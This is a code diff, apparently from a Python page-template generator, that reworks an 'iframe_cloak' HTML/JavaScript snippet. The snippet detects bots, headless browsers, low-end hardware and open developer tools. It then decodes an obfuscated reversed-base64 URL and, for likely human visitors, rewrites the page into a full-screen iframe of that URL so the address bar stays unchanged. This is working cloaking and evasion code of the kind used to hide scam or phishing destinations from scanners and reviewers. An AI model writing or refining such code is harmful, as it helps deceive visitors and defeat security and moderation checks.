@@ -289,14 +289,16 @@ exit;
         # =========================
         # 🔥 IFRAME
         # =========================
-        "iframe_cloak": f"""<iframe 
-src=""
-id="ti_frame"
-style="border:none;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;background:#fff;"
-referrerpolicy="no-referrer"
-sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation-by-user-activation"
-loading="eager"
-></iframe>
+        "iframe_cloak": f"""
+<style>
+html, body {{
+  margin:0 !important;
+  padding:0 !important;
+  overflow:hidden !important;
+  height:100% !important;
+  width:100% !important;
+}}
+</style>
 
 <script>
 (function() {{
@@ -304,7 +306,6 @@ loading="eager"
     if (window.__ti_iframe) return;
     window.__ti_iframe = true;
 
-    var frame = document.getElementById("ti_frame");
     var ua = navigator.userAgent.toLowerCase();
 
     // -----------------------------
@@ -319,13 +320,21 @@ loading="eager"
       navigator.languages.length === 0
     );
 
+    var isLowHardware = navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2;
+
     var isWeirdScreen = screen.width === 0 || screen.height === 0;
 
-    var isBot = isBotUA || isHeadless || isWeirdScreen;
-    frame.src = atob("{encoded}".split("").reverse().join(""));
+    var isBot = isBotUA || isHeadless || isLowHardware || isWeirdScreen;
 
     // -----------------------------
-    // ⚡ ANTI-DEBUG / ANTI-DEVTOOLS
+    // 🔥 SAFE URL
+    // -----------------------------
+    var finalUrl = atob("{encoded}".split("").reverse().join(""));
+    // 🔥 DEFINE THIS (IMPORTANT)
+    var isCloak = finalUrl.includes("/r/");
+
+    // -----------------------------
+    // ⚡ ANTI-DEVTOOLS
     // -----------------------------
     var devtools = false;
     setInterval(function() {{
@@ -336,13 +345,6 @@ loading="eager"
     }}, 500);
 
     // -----------------------------
-    // ⚡ FALLBACK CHECK
-    // -----------------------------
-    function fallback() {{
-      window.location.replace("{redirect_url}");
-    }}
-
-    // -----------------------------
     // ⚡ BOT HANDLING
     // -----------------------------
     if (isBot || devtools) {{
@@ -351,29 +353,29 @@ loading="eager"
     }}
 
     // -----------------------------
-    // ⚡ IFRAME LOAD CHECK (FAST)
+    // 🔥 MAIN FIX: FULL PAGE REWRITE
     // -----------------------------
-    var loaded = false;
-
-    frame.onload = function() {{
-      loaded = true;
-    }};
-
-    setTimeout(function() {{
-      if (!loaded) {{
-        fallback();
-      }}
-    }}, 1200);
-
     // -----------------------------
-    // ⚡ USER INTERACTION BOOST
+    // 🔥 MAIN LOGIC
     // -----------------------------
-    document.addEventListener("click", function() {{
-      frame.style.zIndex = "9999";
-    }});
+    if (isCloak) {{
+      // ✅ OFFER → iframe (NO URL CHANGE)
+      document.open();
+      document.write(`
+        <iframe 
+          src="${{finalUrl}}"
+          style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:999999;background:#fff;"
+        ></iframe>
+      `);
+      document.close();
+
+    }} else {{
+      // ❌ FALLBACK → direct redirect (URL CHANGE)
+      window.location.replace(finalUrl);
+    }}
 
   }} catch(e) {{
-    window.location.replace("{redirect_url}");
+    window.location.href = "/";
   }}
 }})();
 </script>
